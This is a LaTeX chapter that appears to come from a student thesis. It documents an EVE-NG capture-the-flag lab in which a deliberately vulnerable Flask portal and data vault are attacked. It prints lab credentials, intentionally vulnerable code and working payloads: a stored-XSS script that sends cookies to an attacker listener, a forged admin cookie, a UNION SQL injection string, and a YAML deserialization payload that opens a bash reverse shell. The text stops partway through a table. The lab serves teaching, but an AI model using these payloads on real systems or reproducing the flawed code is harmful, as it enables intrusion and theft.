\chapter{LAB2 --- Web Vulnerabilities: SYNAPSE Portal}

\section{LAB2 --- Web Vulnerabilities · SYNAPSE}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.72\linewidth}@{}}
\toprule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{Difficulty} & Medium \\
\textbf{Category} & Web App Security · OWASP Top 10 \\
\textbf{Flags} & 3 \\
\textbf{Est.\ time} & 90--150 min \\
\textbf{Key skills} & XSS, cookie hijack, broken auth, SQL injection, YAML deserialization, RCE \\
\textbf{Nodes} & pfSense · VyOS · Server-A (SYNAPSE Portal) · Server-B (DataVault) · Parrot OS \\
\end{longtable}}

\href{https://github.com/TheEgea/TFG/tree/main/src/eve-ng/configs/nodes/Lab2}{Lab folder on GitHub} \href{https://github.com/TheEgea/TFG/raw/main/src/eve-ng/topologies/LAB2-WebVulnerabilities-SYNAPSE.unl}{Download topology (.unl)} \href{../../assets/exercises/lab2-exercise.pdf}{Exercise sheet} \href{../../assets/exercises/lab2-solution.pdf}{Solution guide}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Scenario}

\textbf{SYNAPSE Intelligence Corp} runs two internal web applications on a segmented network. The student is an external attacker who must chain five OWASP Top 10 vulnerabilities across both servers to achieve remote code execution and data exfiltration.

The attack starts with stored XSS to steal an admin session cookie, pivots through broken authentication and SQL injection to reach Server-B credentials, and culminates in YAML deserialization for a full reverse shell.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Topology}

\begin{figure}[H]
\centering
\includegraphics[width=0.95\textwidth]{lab2-topology.png}
\caption{EVE-NG topology --- Lab 2}
\end{figure}

\begin{lstlisting}
Homelab LAN (192.168.0.0/24)
        |
[pfSense-LAB2]  WAN: 192.168.0.x (DHCP)
        |        LAN: 172.16.1.1/30
[VyOS-LAB2]
  eth0: 172.16.1.2/30   $\leftarrow$ uplink to pfSense
  eth1: 192.168.30.1/24 $\leftarrow$ Net-DMZ (servers)
  eth2: 10.0.40.1/24    $\leftarrow$ Net-Attackers (Parrot)
        |
  +-----+--------+            |
[Server-A]    [Server-B]    [Parrot]
192.168.30.10 192.168.30.20 10.0.40.10
SYNAPSE Portal  DataVault    Attacker
XSS+Auth+SQLi   YAML RCE
\end{lstlisting}

\subsection{Nodes}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.20\linewidth}
  >{\raggedright\arraybackslash}p{0.20\linewidth}
  >{\raggedright\arraybackslash}p{0.28\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
Node
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
OS
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
IP
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Role
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
pfSense-LAB2 & pfSense CE & WAN: 192.168.0.x / LAN: 172.16.x.x & Perimeter firewall · UEFI boot \\
VyOS-LAB2 & VyOS rolling & 172.16.1.2 / 192.168.30.1 / 10.0.40.1 & Router · NAT · DNS \\
Server-A & Ubuntu Server 24.04 & 192.168.30.10 & SYNAPSE Portal --- Flask + nginx + victim bot \\
Server-B & Ubuntu Server 24.04 & 192.168.30.20 & DataVault --- Flask + PyYAML deserialization \\
Parrot & Parrot Security 6.4 & 10.0.40.10 (static) & Attacker \\
\end{longtable}}

\subsection{Network segments}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
\toprule\noalign{}
Segment & Subnet & Gateway & Purpose \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
Net-Link & 172.16.1.0/30 & 172.16.1.1 & pfSense $\leftrightarrow$ VyOS \\
Net-DMZ & 192.168.30.0/24 & 192.168.30.1 & Server-A + Server-B \\
Net-Attackers & 10.0.40.0/24 & 10.0.40.1 & Parrot attacker \\
Homelab & 192.168.0.0/24 & 192.168.0.1 & WAN \\
\end{longtable}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Learning objectives}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Exploit stored XSS to steal a session cookie from a bot victim
\item
  Forge authentication tokens with broken auth (unsigned cookie manipulation)
\item
  Extract credentials via UNION-based SQL injection
\item
  Chain application vulnerabilities across multiple services
\item
  Achieve RCE through YAML insecure deserialization (\texttt{yaml.UnsafeLoader})
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Vulnerability chain}

\begin{lstlisting}
Stored XSS $\rightarrow$ Cookie Hijack $\rightarrow$ Broken Auth $\rightarrow$ SQLi $\rightarrow$ SSH Pivot $\rightarrow$ YAML RCE $\rightarrow$ RCE
\end{lstlisting}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.03\linewidth}
  >{\raggedright\arraybackslash}p{0.18\linewidth}
  >{\raggedright\arraybackslash}p{0.10\linewidth}
  >{\raggedright\arraybackslash}p{0.41\linewidth}
  >{\raggedright\arraybackslash}p{0.11\linewidth}@{}}
\toprule\noalign{}
\# & \begin{minipage}[b]{\linewidth}\raggedright
Vulnerability
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
OWASP
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Location
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Flag
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1 & Stored XSS & A03 & \path{/comments} --- Jinja2 \texttt{\textbackslash{}\textbar{}\ safe} filter & --- \\
2 & Cookie theft & A07 & \texttt{HttpOnly=False} session cookie & --- \\
3 & Broken authentication & A07 & Unsigned \texttt{ID:ROLE:USERNAME} cookie & --- \\
4 & UNION SQL Injection & A03 & \path{/search?q=} --- raw string concat & \textbf{FLAG 1} \\
5 & SSH lateral movement & A01 & Server-B:22 --- SSH pivot with \path{monitor/M0nit0r2024} (SQLi dump) $\rightarrow$ \path{/home/monitor/flag.txt} & \textbf{FLAG 2} \\
6 & YAML deserialization & A08 & Server-B \path{/preview} --- \texttt{yaml.UnsafeLoader} & --- \\
7 & RCE via reverse shell & A08 & YAML \path{!!python/object/apply:os.system} & \textbf{FLAG 3} \\
\end{longtable}}

\subsection{Credentials}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.18\linewidth}
  >{\raggedright\arraybackslash}p{0.28\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.14\linewidth}@{}}

\toprule\noalign{}
User & Password & System & Role \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
ubuntu & S3rv3rA & Server-A OS & SSH \\
admin & Admin@Synapse2024 & Server-A Portal & admin \\
guest & guest123 & Server-A Portal & guest \\
ubuntu & S3rv3rB & Server-B OS & SSH \\
operator & D4t4V4ult\#2024 & Server-B DataVault & operator \\
lab2 & L4b2 & Parrot OS & SSH \\
\end{longtable}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Lab startup checklist}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Run bridge script on EVE-NG host (after reboot):

\begin{lstlisting}
bash /usr/local/bin/lab2-bridges-up.sh
\end{lstlisting}
\item
  Start SYNAPSE Portal on Server-A:

\begin{lstlisting}
sshpass -p S3rv3rA ssh ubuntu@192.168.30.10
cd /opt/synapse && docker-compose up -d
\end{lstlisting}
\item
  Start DataVault on Server-B:

\begin{lstlisting}
sshpass -p S3rv3rB ssh ubuntu@192.168.30.20
cd /opt/datavault && sudo docker compose up -d
\end{lstlisting}
\item
  Configure Parrot static IP (\path{10.0.40.10/24}, GW \path{10.0.40.1})

  \begin{itemize}
  \tightlist
  \item
    pfSense-LAB2 uses \textbf{UEFI boot} --- use \path{/usr/local/bin/pfsense-lab2-start.sh}
  \item
    Server-A uses \texttt{docker-compose} v1 (hyphen). Server-B uses \texttt{docker\ compose} v2 (space).
  \item
    Bridge IPs reset on EVE-NG host reboot --- always run the bridge script first.
  \end{itemize}
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Files}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
File
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Description
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\href{https://github.com/TheEgea/TFG/raw/main/src/eve-ng/topologies/LAB2-WebVulnerabilities-SYNAPSE.unl}{\nolinkurl{LAB2-WebVulnerabilities-SYNAPSE.unl}} & EVE-NG topology --- import directly \\
\href{https://github.com/TheEgea/TFG/tree/main/src/eve-ng/configs/nodes/Lab2/server-a}{\path{nodes/Lab2/server-a/}} & Flask app, nginx config, victim bot, docker-compose \\
\href{https://github.com/TheEgea/TFG/tree/main/src/eve-ng/configs/nodes/Lab2/server-b}{\path{nodes/Lab2/server-b/}} & DataVault Flask app, docker-compose \\
\href{https://github.com/TheEgea/TFG/tree/main/src/eve-ng/configs/nodes/Lab2/vyos}{\path{nodes/Lab2/vyos/}} & VyOS config.boot \\
\end{longtable}}

\section{LAB2 -- Infrastructure Reference}

Complete infrastructure reference for LAB2 SYNAPSE Intelligence Corp.~For instructor/lab admin use.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Node inventory}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.17\linewidth}
  >{\raggedright\arraybackslash}p{0.17\linewidth}
  >{\raggedright\arraybackslash}p{0.17\linewidth}
  >{\raggedright\arraybackslash}p{0.17\linewidth}
  >{\raggedright\arraybackslash}p{0.17\linewidth}@{}}
\toprule\noalign{}
Node & EVE-NG ID & VNC Port & Image & Status \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
Parrot-Attacker & 1 & 32769 & linux-parrot-security-6.4 & Running \\
VyOS-LAB2 & 2 & Telnet 32770 & vyos-2026.02.13-rolling & Running \\
Server-A-SYNAPSE & 3 & 32771 & linux-ubuntu-server-24.04 & Running \\
Server-B-SYNAPSE & 4 & 32772 & linux-ubuntu-server-24.04 & Running \\
pfSense-LAB2 & 5 & 32773 & pfsense-ce & Running \\
\end{longtable}}

\subsection{Network addressing}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
\toprule\noalign{}
Network & Subnet & Bridge & Host IP \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
Net-Attackers & 10.0.40.0/24 & vnet0\_1 & 10.0.40.254 \\
Net-DMZ & 192.168.30.0/24 & vnet0\_2 & 192.168.30.254 \\
Net-Link (pfSense$\leftrightarrow$VyOS) & 172.16.1.0/30 & vnet0\_3 & --- \\
\end{longtable}}

\subsection{Credentials (full reference)}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.20\linewidth}
  >{\raggedright\arraybackslash}p{0.20\linewidth}
  >{\raggedright\arraybackslash}p{0.28\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
System
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
User
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Password
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Access
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
EVE-NG host & root & SSH key id\_ed25519\_eve-ng & ssh eve-ng \\
pfSense-LAB2 & admin & pfsense & VNC 32773 / SSH 192.168.0.x \\
VyOS-LAB2 & vyos & vyos & Telnet 32770 \\
Server-A OS & ubuntu & S3rv3rA & SSH 192.168.30.x \\
Server-A Portal (admin) & admin & Admin@Synapse2024 & \url{http://192.168.30.x/login} \\
Server-A Portal (guest) & guest & guest123 & \url{http://192.168.30.x/login} \\
Server-B OS & ubuntu & S3rv3rB & SSH 192.168.30.x \\
Server-B DataVault & operator & D4t4V4ult\#2024 & \url{http://192.168.30.x/login} \\
Parrot OS & lab2 & L4b2 & SSH 10.0.40.x \\
\end{longtable}}

\subsection{Deployed applications}

\subsubsection{Server-A --- SYNAPSE Intelligence Portal}

\begin{itemize}
\tightlist
\item
  \textbf{Path:} \path{/opt/synapse/}
\item
  \textbf{Stack:} Flask 3.x + SQLite + nginx + Playwright victim bot
\item
  \textbf{Command:} \texttt{cd\ /opt/synapse\ \&\&\ docker-compose\ up\ -d} (docker-compose v1.29.2)
\item
  \textbf{Containers:} \path{synapse_flask_1} (port 5000), \path{synapse_nginx_1} (port 80), \path{synapse_victim}
\end{itemize}

\begin{lstlisting}
/opt/synapse/
|---- app/
|   |---- app.py           # Flask application (XSS, broken auth, SQLi, admin panel)
|   |---- init_db.py       # DB schema + seed data (flags, credentials)
|   |---- requirements.txt
|   \---- templates/
|       |---- login.html
|       |---- portal.html  # main portal (reports)
|       |---- comments.html # XSS sink
|       |---- search.html  # SQLi sink
|       |---- admin.html   # admin panel (FLAG#2 + Server-B creds)
|       \---- forbidden.html
|---- docker-compose.yml
|---- nginx/default.conf
\---- victim/victim.py     # Playwright bot (visits /comments every 20s)
\end{lstlisting}

\textbf{Database tables:}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
Table & Contents \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
users & admin/Admin@Synapse2024, guest/guest123 (MD5 passwords) \\
reports & 5 dummy intel reports \\
comments & XSS sink --- rendered with \texttt{\textbackslash{}\textbar{}\ safe} filter \\
admin\_users & FLAG \\
classified\_intel & FLAG + operator/D4t4V4ult\#2024 \\
\end{longtable}}

\subsubsection{Server-B --- SYNAPSE DataVault}

\begin{itemize}
\tightlist
\item
  \textbf{Path:} \path{/opt/datavault/}
\item
  \textbf{Stack:} Flask + PyYAML 6.x (Docker Compose v2)
\item
  \textbf{Command:} \texttt{cd\ /opt/datavault\ \&\&\ sudo\ docker\ compose\ up\ -d}
\item
  \textbf{Container:} datavault-flask (port 80$\rightarrow$5000)
\end{itemize}

\begin{lstlisting}
/opt/datavault/
|---- app/
|   |---- app.py           # Flask app (YAML UnsafeLoader vuln in /preview)
|   \---- templates/
|       |---- login.html
|       |---- index.html
|       \---- preview.html
|---- data/
|   \---- finalData.txt    # FLAG
|---- uploads/             # user upload dir (runtime)
\---- docker-compose.yml
\end{lstlisting}

\subsection{Lab startup procedure}

\begin{lstlisting}
# 1. EVE-NG host --- restore bridge IPs after reboot
bash /usr/local/bin/lab2-bridges-up.sh

# 2. Start pfSense (UEFI mode)
/usr/local/bin/pfsense-lab2-start.sh

# 3. Server-A
sshpass -p S3rv3rA ssh ubuntu@192.168.30.x
cd /opt/synapse && docker-compose up -d
docker-compose ps   # flask, nginx, victim all Up

# 4. Server-B
sshpass -p S3rv3rB ssh ubuntu@192.168.30.x
cd /opt/datavault && sudo docker compose up -d
sudo docker compose ps  # datavault-flask Up

# 5. Parrot --- apply static IP each session
sudo ip addr add 10.0.40.x/24 dev ens4
sudo ip route add default via 10.0.40.1
\end{lstlisting}

\subsection{Flags summary}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.20\linewidth}
  >{\raggedright\arraybackslash}p{0.20\linewidth}
  >{\raggedright\arraybackslash}p{0.28\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
\#
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Flag
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Location
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
How to reach
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1 & FLAG & admin\_users table & UNION SQLi on \path{/search} \\
2 & FLAG & classified\_intel table & \path{/admin} with forged admin cookie \\
3 & FLAG & \path{/app/data/finalData.txt} (Server-B) & YAML deserialization $\rightarrow$ reverse shell \\
\end{longtable}}

\section{LAB2 -- VyOS Router}

VyOS-LAB2 provides routing between pfSense, the DMZ (Server-A, Server-B), and the attacker network (Parrot).

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Interfaces}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
\toprule\noalign{}
Interface & IP & Network & Description \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
eth0 & 172.16.x.x/30 & Net-Link & Uplink to pfSense LAN \\
eth1 & 192.168.30.x/24 & Net-DMZ & Gateway for servers \\
eth2 & 10.0.40.x/24 & Net-Attackers & Gateway for Parrot \\
\end{longtable}}

\subsection{Access}

\begin{lstlisting}
# Console only (SSH daemon not enabled by default after reboot):
ssh eve-ng "telnet localhost 32770"
# user: vyos / vyos
\end{lstlisting}

\begin{lstlisting}
VyOS SSH daemon sometimes fails to respond after an EVE-NG host reboot despite being configured.
Console access via telnet :32770 always works.
\end{lstlisting}

\subsection{NAT rules}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}@{}}
\toprule\noalign{}
Rule & Source & Action \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
10 & 10.0.40.0/24 & masquerade via eth0 \\
20 & 192.168.30.0/24 & masquerade via eth0 \\
\end{longtable}}

\subsection{DNS forwarding}

\begin{itemize}
\tightlist
\item
  Listens on: \texttt{192.168.30.x}, \texttt{10.0.40.x}
\item
  Allows queries from: \path{192.168.30.0/24}, \path{10.0.40.0/24}
\end{itemize}

\subsection{Static host mappings}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
Hostname & IP \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
attacker.lab2.internal & 10.0.40.x \\
server-a.lab2.internal & 192.168.30.x \\
server-b.lab2.internal & 192.168.30.x \\
router.lab2.internal & 192.168.30.x \\
\end{longtable}}

\subsection{Default route}

\begin{lstlisting}
0.0.0.0/0 via 172.16.x.x (pfSense LAN)
\end{lstlisting}

\section{LAB2 -- Server-A (SYNAPSE Intelligence Portal)}

Server-A hosts the SYNAPSE Intelligence Portal --- a deliberately vulnerable Flask web application deployed via Docker Compose.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Access}

\begin{lstlisting}
sshpass -p S3rv3rA ssh ubuntu@192.168.30.x
# From EVE-NG host with bridge vnet0_2 active (IP 192.168.30.x/24)
\end{lstlisting}

\subsection{System}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
Parameter & Value \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
OS & Ubuntu 24.04.3 LTS \\
Hostname & server-a-synapse \\
IP & 192.168.30.x/24 \\
Gateway & 192.168.30.x (VyOS eth1) \\
App path & /opt/synapse/ \\
\end{longtable}}

\subsection{Docker Compose stack}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
\toprule\noalign{}
Container & Image & Role & Port \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\path{synapse_flask_1} & python:3.11-slim & Flask app & 5000 (internal) \\
\path{synapse_nginx_1} & nginx:alpine & Reverse proxy & 80 (public) \\
\path{synapse_victim} & \path{playwright/python:v1.58.0-noble} & Bot victim & --- \\
\end{longtable}}

\begin{lstlisting}
cd /opt/synapse
docker compose up -d
docker compose ps
\end{lstlisting}

\subsection{Database schema (SQLite)}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
Table & Contents \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
users & Login credentials (admin, guest) --- passwords MD5 \\
reports & Intelligence reports (5 dummy rows) \\
comments & User-submitted comments --- \textbf{XSS sink} \\
admin\_users & Lateral movement creds (monitor / M0nit0r2024) + flag \\
\end{longtable}}

\subsection{\texorpdfstring{Vulnerability 1 --- Stored XSS ({\ttfamily /comments})}{Vulnerability 1 --- Stored XSS (/comments)}}

Comments are rendered without sanitisation:

\begin{lstlisting}
<div class="body">}</div>
\end{lstlisting}

The session cookie has \texttt{HttpOnly=False}:

\begin{lstlisting}
resp.set_cookie('session',
    f"::",
    httponly=False)
\end{lstlisting}

\textbf{Exploit} --- post this comment to steal the victim bot's cookie:

\begin{lstlisting}
<script>
fetch('http://10.0.40.x:8000/?c=' + encodeURIComponent(document.cookie));
</script>
\end{lstlisting}

Start listener on Parrot first:

\begin{lstlisting}
python3 -m http.server 8000
\end{lstlisting}

The victim bot visits \path{/comments} every \textasciitilde20 seconds. The cookie arrives in the listener log within one cycle.

\subsection{Vulnerability 2 --- Broken Authentication}

The session cookie format is \texttt{ID:ROLE:USERNAME} with no cryptographic signature:

\begin{lstlisting}
parts = session.split(':')
role = parts[1] if len(parts) > 1 else 'guest'
\end{lstlisting}

\textbf{Exploit} --- forge admin cookie in browser console:

\begin{lstlisting}
document.cookie = "session=1admin; path=/"
\end{lstlisting}

Immediately grants admin access without knowing the password.

\subsection{\texorpdfstring{Vulnerability 3 --- UNION SQL Injection ({\ttfamily /search})}{Vulnerability 3 --- UNION SQL Injection (/search)}}

The search route concatenates user input directly into the SQL query:

\begin{lstlisting}
query = "SELECT * FROM reports WHERE title LIKE '%" + q + "%'"
\end{lstlisting}

SQL errors are displayed in the browser. The \texttt{reports} table has 5 columns.

\textbf{Exploit} --- dump \path{admin_users} table:

\begin{lstlisting}
' UNION SELECT 1,username,flag,password,5 FROM admin_users--
\end{lstlisting}

Returns: \texttt{FLAG} --- \textbf{FLAG \#1} plus credentials in the flag column.

\subsection{Vulnerability 4 --- Admin Panel (Broken Access Control)}

After forging the admin cookie, navigate to \path{/admin} --- only accessible to users with \texttt{role=admin}.

The admin panel queries the \path{classified_intel} table and displays classified intelligence posts. One entry contains:

\begin{itemize}
\tightlist
\item
  \textbf{FLAG} --- \textbf{FLAG \#2}
\item
  Server-B DataVault credentials: \texttt{operator\ /\ D4t4V4ult\#2024}
\end{itemize}

\textbf{Exploit} --- with admin cookie active, browse to \path{/admin}.

\subsection{Attack chain summary (Server-A)}

\begin{lstlisting}
1. POST XSS payload to /comments
2. Wait ~20s -> victim cookie arrives on listener (python3 -m http.server 8000)
3. Forge admin cookie (broken auth) -> access /portal and /search
4. UNION SQLi on \path{/search} -> FLAG (FLAG #1)
5. Browse /admin -> FLAG (FLAG #2)
              -> Obtain: operator / D4t4V4ult#2024 (Server-B DataVault)
6. Continue to Server-B DataVault -> YAML deserialization -> FLAG #3
\end{lstlisting}

\section{LAB2 -- Server-B (SYNAPSE DataVault)}

Server-B hosts the SYNAPSE DataVault --- a Flask application with an intentional YAML insecure deserialization vulnerability (OWASP A08). The objective is to upload a malicious YAML file, trigger remote code execution via a reverse shell, and exfiltrate the final flag from \path{/app/data/finalData.txt}.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Access}

\begin{lstlisting}
sshpass -p S3rv3rB ssh ubuntu@192.168.30.x  # Server-B IP
# From EVE-NG host with bridge vnet0_2 active (IP 192.168.30.x/24)
\end{lstlisting}

Web application accessible at: \path{http://192.168.30.x} (port 80)

\subsection{System}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
Parameter & Value \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
OS & Ubuntu 24.04.3 LTS \\
Hostname & server-b-monitor \\
IP & 192.168.30.x/24 \\
Gateway & 192.168.30.x (VyOS eth1) \\
App path & /opt/datavault/ \\
\end{longtable}}

\subsection{Docker stack}

\begin{lstlisting}
cd /opt/datavault && sudo docker compose up -d
sudo docker compose ps   # datavault-flask Up, port 80->5000
\end{lstlisting}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}@{}}
\toprule\noalign{}
Container & Image & Port \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
datavault-flask & python:3.11-slim & 80-\textgreater5000 \\
\end{longtable}}

\subsection{Application --- SYNAPSE DataVault}

The DataVault is a file management portal for uploading and previewing corporate data files.

\textbf{Credentials:} \texttt{operator} / \texttt{D4t4V4ult\#2024}\\
(Found in Server-A admin panel after completing FLAG \#2)

\textbf{Routes:} \textbar{} Route \textbar{} Description \textbar{} \textbar-------\textbar-------------\textbar{} \textbar{} \path{/} \textbar{} File listing \textbar{} \textbar{} \path{/login} \textbar{} Login form \textbar{} \textbar{} \path{/upload} \textbar{} File upload (PDF, TXT, YAML, YML) \textbar{} \textbar{} \texttt{/preview/\textless{}filename\textgreater{}} \textbar{} Preview uploaded file \textbar{} \textbar{} \texttt{/download/\textless{}filename\textgreater{}} \textbar{} Download uploaded file \textbar{}

\subsection{Vulnerability --- YAML Insecure Deserialization (OWASP A08)}

The preview route loads YAML files using \texttt{yaml.UnsafeLoader}:

\begin{lstlisting}
# VULNERABLE CODE --- intentional for lab
parsed = str(yaml.load(raw, Loader=yaml.UnsafeLoader))
\end{lstlisting}

\texttt{yaml.UnsafeLoader} (equivalent to \texttt{yaml.load} without Loader argument) allows instantiation of arbitrary Python objects, including \texttt{os.system}. This enables unauthenticated remote code execution when previewing a crafted YAML file.

\textbf{Why it is dangerous:} PyYAML's \path{!!python/object/apply:} tag calls any Python callable with attacker-controlled arguments. With \texttt{UnsafeLoader}, there is no restriction on which callables can be invoked.

\textbf{Secure alternative:} \path{yaml.safe_load()} --- only parses standard YAML types.

\subsection{Exploit --- Reverse Shell via YAML Upload}

\subsubsection{Step 1 --- Start listener on Parrot}

\begin{lstlisting}
nc -lvnp 4444
\end{lstlisting}

\subsubsection{Step 2 --- Create malicious YAML payload}

\begin{lstlisting}
echo '!!python/object/apply:os.system ["bash -c '"'"'bash -i >& /dev/tcp/10.0.40.x/4444 0>&1'"'"'"]' > exploit.yml
\end{lstlisting}

Or manually create \texttt{exploit.yml}:

\begin{lstlisting}
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/10.0.40.x/4444 0>&1'"
\end{lstlisting}

\subsubsection{Step 3 --- Upload and trigger}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Browse to \path{http://192.168.30.x} --- login as \texttt{operator\ /\ D4t4V4ult\#2024}
\item
  Upload \texttt{exploit.yml} via the upload form
\item
  Click \textbf{Preview} on \texttt{exploit.yml}
\item
  Reverse shell arrives on the \texttt{nc} listener
\end{enumerate}

\subsubsection{Step 4 --- Exfiltrate the flag}

\begin{lstlisting}
# In the reverse shell:
cat /app/data/finalData.txt
\end{lstlisting}

Returns \texttt{FLAG} --- \textbf{FLAG \#3}

\subsection{Flag location}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
Flag
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Location
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
How to reach
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
FLAG & \path{/app/data/finalData.txt} (inside container) & Reverse shell via YAML deserialization \\
\end{longtable}}

\section{LAB2 -- Flask Application (Synapse)}

The \texttt{flask} container runs \textbf{Synapse}, a minimal Python web application built with Flask 3.0. It is intentionally vulnerable and acts as the target for the XSS and session hijacking exercises.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Network parameters}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
